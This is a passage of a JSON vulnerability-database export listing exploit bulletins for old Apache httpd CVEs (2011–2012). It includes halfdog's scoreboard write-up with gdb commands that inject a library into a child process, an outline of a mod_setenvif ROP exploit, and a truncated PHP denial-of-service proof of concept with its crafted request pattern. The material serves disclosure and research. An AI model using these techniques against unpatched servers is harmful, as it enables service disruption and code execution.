            "description": "Bugtraq ID: 53046\r\nCVE ID\uff1aCVE-2012-0883\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684HTTP\u670d\u52a1\u7a0b\u5e8f\r\n\r\n\u7531\u4e8e\u4e0d\u5b89\u5168\u5904\u7406LD_LIBRARY_PATH\uff0c\u53ef\u5bfc\u81f4\u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e2d\u641c\u7d22DSO\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u4ee5HTTPD\u670d\u52a1\u4e0a\u4e0b\u6587\u6267\u884c\u4efb\u610f\u4ee3\u7801\n0\nApache 2.0.x\r\nApache 2.1.x\r\nApache 2.2.x\r\nApache 2.3.x\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\r\nApache\r\n-----\r\nApache Software Foundation Apache 2.4.2\u5df2\u7ecf\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u7528\u6237\u4e0b\u8f7d\u4f7f\u7528\uff1a\r\nhttp://www.apache.org/",
            "modified": "2012-04-20T00:00:00",
            "published": "2012-04-20T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60069",
            "id": "SSV:60069",
            "type": "seebug",
            "title": "Apache HTTP Server 'LD_LIBRARY_PATH'\u4e0d\u5b89\u5168\u5e93\u88c5\u8f7d\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 6.9,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60069"
        }
    ],
    "CVE-2012-0031": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category dos / poc",
            "modified": "2017-03-29T00:00:00",
            "published": "2017-03-29T00:00:00",
            "href": "https://0day.today/exploit/description/27465",
            "id": "1337DAY-ID-27465",
            "type": "zdt",
            "title": "Apache 2.2 - Scoreboard Invalid Free On Shutdown Vulnerability",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/\r\n \r\n## Introduction\r\n \r\nApache 2.2 webservers may use a shared memory segment to share child process status information (scoreboard) between the child processes and the parent process running as root. A child running with lower privileges than the parent process might trigger an invalid free in the privileged parent process during parent shutdown by modifying data on the shared memory segment.\r\n \r\n## Method\r\n \r\nA child process can trigger the bug by changing the value of ap_scoreboard_e sb_type, which resides in the global_score structure on the shared memory segment. The value is usually 2 (SB_SHARED):\r\n \r\ntypedef struct {\r\n    int             server_limit;\r\n    int             thread_limit;\r\n    ap_scoreboard_e sb_type;\r\n    ap_generation_t running_generation; /* the generation of children which\r\n                                         * should still be serving requests.\r\n                                         */\r\n    apr_time_t restart_time;\r\n    int             lb_limit;\r\n} global_score;\r\n \r\nWhen changing the scoreboard type of a shared memory segment to something else, the root process will try to release the shared memory using free during normal shutdown. Since the memory was allocated using mmap, not malloc, the call to free from ap_cleanup_scoreboard (server/scoreboard.c) triggers abort within libc.\r\n \r\napr_status_t ap_cleanup_scoreboard(void *d)\r\n{\r\n    if (ap_scoreboard_image == NULL) {\r\n        return APR_SUCCESS;\r\n    }\r\n    if (ap_scoreboard_image->global->sb_type == SB_SHARED) {\r\n        ap_cleanup_shared_mem(NULL);\r\n    }\r\n    else {\r\n        free(ap_scoreboard_image->global);\r\n        free(ap_scoreboard_image);\r\n        ap_scoreboard_image = NULL;\r\n    }\r\n    return APR_SUCCESS;\r\n}\r\n \r\nAbort output is written to apache default error log:\r\n \r\n[Fri Dec 30 10:19:57 2011] [notice] caught SIGTERM, shutting down\r\n*** glibc detected *** /usr/sbin/apache2: free(): invalid pointer: 0xb76f4008 ***\r\n======= Backtrace: =========\r\n/lib/i386-linux-gnu/libc.so.6(+0x6ebc2)[0x17ebc2]\r\n/lib/i386-linux-gnu/libc.so.6(+0x6f862)[0x17f862]\r\n/lib/i386-linux-gnu/libc.so.6(cfree+0x6d)[0x18294d]\r\n/usr/sbin/apache2(ap_cleanup_scoreboard+0x29)[0xa57519]\r\n/usr/lib/libapr-1.so.0(+0x19846)[0x545846]\r\n/usr/lib/libapr-1.so.0(apr_pool_destroy+0x52)[0x5449ec]\r\n/usr/sbin/apache2(+0x1f063)[0xa52063]\r\n/usr/sbin/apache2(main+0xeea)[0xa51e3a]\r\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x129113]\r\n/usr/sbin/apache2(+0x1ef3d)[0xa51f3d]\r\n======= Memory map: ========\r\n00110000-00286000 r-xp 00000000 08:01 132367\r\n \r\nTo reproduce, attach to a www-data (non-root) child process and increment the value at offset 0x10 in the shared memory segment. The search and replace can also be accomplished by compiling LibScoreboardTest.c (http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/LibScoreboardTest.c) and loading it into a child process using gdb --pid [childpid] and following commands:\r\n \r\nset *(int*)($esp+4)=\"/var/www/libExploit.so\"\r\nset *(int*)($esp+8)=1\r\nset $eip=*__libc_dlopen_mode\r\ncontinue\r\n \r\nWithout gdb, the mod_setenv exploit demo (2nd attempt) (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html) could be used to load the code.\n\n#  0day.today [2018-01-01]  #",
            "cvss": {
                "score": 4.6,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-27465"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 51407\r\nCVE ID: CVE-2012-0031\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u8de8\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u4e2d\u7684\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u66f4\u6539scoreboard\u5171\u4eab\u5185\u5b58\u6bb5\u7684\u5185\u5b58\u7c7b\u578b\u8bb0\u5f55\uff0c\u8fd9\u4f1a\u88ab\u5229\u7528\u9020\u6210\u7236\u8fdb\u7a0b\u5173\u95ed\u65f6\u65e0\u6548\u7684\u91ca\u653e\u64cd\u4f5c\uff0c\u4f7f\u672c\u5730\u653b\u51fb\u8005\u53ef\u7ed5\u8fc7\u67d0\u4e9b\u5b89\u5168\u9650\u5236\u3002\n0\nApache 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.apache.org",
            "modified": "2012-01-17T00:00:00",
            "published": "2012-01-17T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30024",
            "id": "SSV:30024",
            "type": "seebug",
            "title": "Apache 2.2.x Scoreboard\u672c\u5730\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.6,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30024"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache 2.2 - Scoreboard Invalid Free On Shutdown. CVE-2012-0031. Dos exploit for Linux platform",
            "modified": "2012-01-11T00:00:00",
            "published": "2012-01-11T00:00:00",
            "id": "EDB-ID:41768",
            "href": "https://www.exploit-db.com/exploits/41768/",
            "type": "exploitdb",
            "title": "Apache 2.2 - Scoreboard Invalid Free On Shutdown",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/\r\n\r\n## Introduction\r\n\r\nApache 2.2 webservers may use a shared memory segment to share child process status information (scoreboard) between the child processes and the parent process running as root. A child running with lower privileges than the parent process might trigger an invalid free in the privileged parent process during parent shutdown by modifying data on the shared memory segment.\r\n\r\n## Method\r\n\r\nA child process can trigger the bug by changing the value of ap_scoreboard_e sb_type, which resides in the global_score structure on the shared memory segment. The value is usually 2 (SB_SHARED):\r\n\r\ntypedef struct {\r\n    int             server_limit;\r\n    int             thread_limit;\r\n    ap_scoreboard_e sb_type;\r\n    ap_generation_t running_generation; /* the generation of children which\r\n                                         * should still be serving requests.\r\n                                         */\r\n    apr_time_t restart_time;\r\n    int             lb_limit;\r\n} global_score;\r\n\r\nWhen changing the scoreboard type of a shared memory segment to something else, the root process will try to release the shared memory using free during normal shutdown. Since the memory was allocated using mmap, not malloc, the call to free from ap_cleanup_scoreboard (server/scoreboard.c) triggers abort within libc.\r\n\r\napr_status_t ap_cleanup_scoreboard(void *d)\r\n{\r\n    if (ap_scoreboard_image == NULL) {\r\n        return APR_SUCCESS;\r\n    }\r\n    if (ap_scoreboard_image->global->sb_type == SB_SHARED) {\r\n        ap_cleanup_shared_mem(NULL);\r\n    }\r\n    else {\r\n        free(ap_scoreboard_image->global);\r\n        free(ap_scoreboard_image);\r\n        ap_scoreboard_image = NULL;\r\n    }\r\n    return APR_SUCCESS;\r\n}\r\n\r\nAbort output is written to apache default error log:\r\n\r\n[Fri Dec 30 10:19:57 2011] [notice] caught SIGTERM, shutting down\r\n*** glibc detected *** /usr/sbin/apache2: free(): invalid pointer: 0xb76f4008 ***\r\n======= Backtrace: =========\r\n/lib/i386-linux-gnu/libc.so.6(+0x6ebc2)[0x17ebc2]\r\n/lib/i386-linux-gnu/libc.so.6(+0x6f862)[0x17f862]\r\n/lib/i386-linux-gnu/libc.so.6(cfree+0x6d)[0x18294d]\r\n/usr/sbin/apache2(ap_cleanup_scoreboard+0x29)[0xa57519]\r\n/usr/lib/libapr-1.so.0(+0x19846)[0x545846]\r\n/usr/lib/libapr-1.so.0(apr_pool_destroy+0x52)[0x5449ec]\r\n/usr/sbin/apache2(+0x1f063)[0xa52063]\r\n/usr/sbin/apache2(main+0xeea)[0xa51e3a]\r\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x129113]\r\n/usr/sbin/apache2(+0x1ef3d)[0xa51f3d]\r\n======= Memory map: ========\r\n00110000-00286000 r-xp 00000000 08:01 132367\r\n\r\nTo reproduce, attach to a www-data (non-root) child process and increment the value at offset 0x10 in the shared memory segment. The search and replace can also be accomplished by compiling LibScoreboardTest.c (http://www.halfdog.net/Security/2011/ApacheScoreboardInvalidFreeOnShutdown/LibScoreboardTest.c) and loading it into a child process using gdb --pid [childpid] and following commands:\r\n\r\nset *(int*)($esp+4)=\"/var/www/libExploit.so\"\r\nset *(int*)($esp+8)=1\r\nset $eip=*__libc_dlopen_mode\r\ncontinue\r\n\r\nWithout gdb, the mod_setenv exploit demo (2nd attempt) (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html) could be used to load the code.",
            "cvss": {
                "score": 4.6,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:41768"
        }
    ],
    "CVE-2011-3348": [
        {
            "bulletinFamily": "exploit",
            "description": "CVE(CAN) ID: CVE-2011-3348\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u8de8\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u7684mod_proxy_balancer\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u6076\u610f\u7528\u6237\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\r\n\r\n\u6b64\u6f0f\u6d1e\u6e90\u4e8e\u7ed3\u5408mod_proxy_balancer\u4f7f\u7528\u65f6\uff0cmod_proxy_ajp\u4e2d\u7684\u7578\u5f62HTTP\u8bf7\u6c42\u5904\u7406\u65f6\u7684\u9519\u8bef\u3002\u901a\u8fc7\u53d1\u9001\u7279\u5236\u7684HTTP\u8bf7\u6c42\uff0c\u53ef\u9020\u6210\u540e\u7aef\u670d\u52a1\u5668\u6545\u969c\uff0c\u76f4\u5230\u91cd\u8bd5\u8d85\u65f6\u7ed3\u675f\u540e\u624d\u4f1a\u7ed3\u675f\u4e34\u65f6DoS\u3002\n\nApache Group Apache HTTP Server 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/",
            "modified": "2011-09-18T00:00:00",
            "published": "2011-09-18T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20934",
            "id": "SSV:20934",
            "title": "Apache HTTP Server mod_proxy_ajp\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20934"
        }
    ],
    "CVE-2011-4415": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category dos / poc",
            "modified": "2017-03-29T00:00:00",
            "published": "2017-03-29T00:00:00",
            "href": "https://0day.today/exploit/description/27473",
            "id": "1337DAY-ID-27473",
            "title": "Apache < 2.0.64 / < 2.2.21 mod_setenvif - Integer Overflow Vulnerability",
            "type": "zdt",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/\r\n \r\n## Background\r\n \r\nThe Apache HTTP Server is an open-source HTTP server for modern operating systems including UNIX, Microsoft Windows, Mac OS/X and Netware. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n \r\n## Problem Description\r\n \r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\r\n \r\n        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\r\n            len += pmatch[no].rm_eo - pmatch[no].rm_so;\r\n        }\r\n \r\nthe length value overflows and is used in a subsequent allocation call of buffer too small:\r\n \r\n \r\n    dest = dst = apr_pcalloc(p, len + 1);\r\n \r\nThe subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\r\n \r\n## Impact\r\n \r\nDepending on the input data, exploitation of this issue leads to:\r\n \r\n- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\r\n- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\r\n- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\r\n \r\nTo trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\r\n \r\n \r\n \r\n \r\n \r\n \r\nSource: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\r\n \r\n## Starting Point\r\n \r\nDuring routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n \r\n## Outline of Exploit\r\n \r\nThe main goals creating the exploit were:\r\n \r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n \r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n \r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.\n\n#  0day.today [2018-03-02]  #",
            "cvss": {
                "score": 4.4,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-27473"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 50639\r\nCVE ID: CVE-2011-4415\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\u3002\r\n\r\nApache HTTP Server 2.0.x\u81f32.0.64\u53ca2.2.x\u81f32.2.21\u5185server/util.c\u4e2d\u7684ap_pregsub\u51fd\u6570\uff0c\u5728\u542f\u7528\u4e86mod_setenvif\u6a21\u5757\u540e\uff0c\u6ca1\u6709\u9650\u5236\u73af\u5883\u53d8\u91cf\u7684\u503c\u5927\u5c0f\uff0c\u901a\u8fc7\u5e26\u6709\u7279\u5236SetEnvIf\u6307\u4ee4\u7684.htaccess\u6587\u4ef6\u548cHTTP\u8bf7\u6c42\u6807\u5934\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\uff08\u5185\u5b58\u7834\u574f\u6216\u7a7a\u6307\u9488\u5f15\u7528\uff09\u3002\r\n0\r\nApache 2.2.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.apache.org",
            "modified": "2012-07-02T00:00:00",
            "published": "2012-07-02T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60250",
            "id": "SSV:60250",
            "type": "seebug",
            "title": "Apache HTTP Server 'ap_pregsub()'\u51fd\u6570\u672c\u5730\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e(CVE-2011-4415)",
            "sourceData": "",
            "cvss": {
                "score": 1.2,
                "vector": "AV:LOCAL/AC:HIGH/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60250"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache < 2.0.64  / < 2.2.21 mod_setenvif - Integer Overflow. CVE-2011-3607,CVE-2011-4415. Dos exploit for Linux platform",
            "modified": "2011-11-02T00:00:00",
            "published": "2011-11-02T00:00:00",
            "id": "EDB-ID:41769",
            "href": "https://www.exploit-db.com/exploits/41769/",
            "type": "exploitdb",
            "title": "Apache < 2.0.64  / < 2.2.21 mod_setenvif - Integer Overflow",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/\r\n\r\n## Background\r\n\r\nThe Apache HTTP Server is an open-source HTTP server for modern operating systems including UNIX, Microsoft Windows, Mac OS/X and Netware. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n\r\n## Problem Description\r\n\r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\r\n\r\n        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\r\n            len += pmatch[no].rm_eo - pmatch[no].rm_so;\r\n        }\r\n\r\nthe length value overflows and is used in a subsequent allocation call of buffer too small:\r\n\r\n\r\n    dest = dst = apr_pcalloc(p, len + 1);\r\n\r\nThe subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\r\n\r\n## Impact\r\n\r\nDepending on the input data, exploitation of this issue leads to:\r\n\r\n- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\r\n- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\r\n- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\r\n\r\nTo trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\r\n\r\n\r\n\r\n\r\n\r\n\r\nSource: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\r\n\r\n## Starting Point\r\n\r\nDuring routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n\r\n## Outline of Exploit\r\n\r\nThe main goals creating the exploit were:\r\n\r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n\r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n\r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.",
            "cvss": {
                "score": 4.4,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:41769"
        }
    ],
    "CVE-2011-0419": [
        {
            "bulletinFamily": "exploit",
            "description": "gtraq ID: 47820\r\nCVE ID\uff1aCVE-2011-0419\r\n\r\nApache APR-util\u662f\u4e00\u6b3e\u53ef\u79fb\u690d\u8fd0\u884c\u5e93\uff0c\u5168\u540d\u4e3aApache Portable Runtime\u3002\r\n\u5f53\u5904\u7406\u67d0\u4e9b\u6a21\u5f0f\u65f6&quot;apr_fnmatch()&quot;\u51fd\u6570\u5b58\u5728\u5faa\u73af\u9012\u5f52\u9519\u8bef\uff0c\u901a\u8fc7\u63d0\u4ea4\u5305\u542b\u901a\u914d\u7b26(\u5982&quot;*&quot;)\u7684\u7279\u5236\u8bf7\u6c42\u65f6\u53ef\u89e6\u53d1\u57fa\u4e8e\u6808\u7684\u6ea2\u51fa\n\nApache APR 1.x\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache Software Foundation APR 1.4.4 \u5df2\u7ecf\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u7528\u6237\u4e0b\u8f7d\u4f7f\u7528\uff1a\r\nhttp://www.apache.org/dist/apr/CHANGES-APR-1.4",
            "modified": "2011-05-13T00:00:00",
            "published": "2011-05-13T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20555",
            "id": "SSV:20555",
            "title": "Apache APR 'apr_fnmatch()'\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20555"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache 1.4/2.2.x APR 'apr_fnmatch()' Denial of Service Vulnerability. CVE-2011-0419. Dos exploit for linux platform",
            "modified": "2011-05-12T00:00:00",
            "published": "2011-05-12T00:00:00",
            "id": "EDB-ID:35738",
            "href": "https://www.exploit-db.com/exploits/35738/",
            "type": "exploitdb",
            "title": "Apache 1.4/2.2.x APR 'apr_fnmatch' Denial of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/47820/info\r\n\r\nApache APR is prone to a vulnerability that may allow attackers to cause a denial-of-service condition.\r\n\r\nApache APR versions prior to 1.4.4 are vulnerable. \r\n\r\n<?php\r\n/*\r\nApache 2.2.17 mod_autoindex local/remote Denial of Service\r\nauthor: Maksymilian Arciemowicz\r\n\r\nCVE: CVE-2011-0419\r\nCWE: CWE-399\r\n\r\nREMOTE\r\nFind some directory with supported mod_autoindex on the server. The directory should contain long filenames.\r\n\r\nhttp://[server]/[directory_with_mod_autoindex]/?P=*?*?*?[to 4k]\r\n\r\nLOCAL\r\nTested on:\r\n127# httpd -v && uname -a \r\nServer version: Apache/2.2.17 (Unix)\r\nServer built:   Dec 28 2010 13:21:44\r\nNetBSD localhost 5.1 NetBSD 5.1 (GENERIC) #0: Sun Nov  7 14:39:56 UTC 2010  builds@b6.netbsd.org:/home/builds/ab/netbsd-5-1-RELEASE/i386/201011061943Z-obj/home/builds/ab/netbsd-5-1-RELEASE/src/sys/arch/i386/compile/GENERIC i386\r\n\r\nResult:\r\n127# ls -la   \r\ntotal 8\r\ndrwxrwxrwx  2 root  wheel   512 Feb  8 21:41 .\r\ndrwxr-xr-x  7 www   wheel  1024 Jan 31 08:49 ..\r\n-rw-r--r--  1 www   wheel  1056 Feb  8 19:39 .htaccess\r\n-rw-r--r--  1 www   wheel     0 Feb  8 19:39 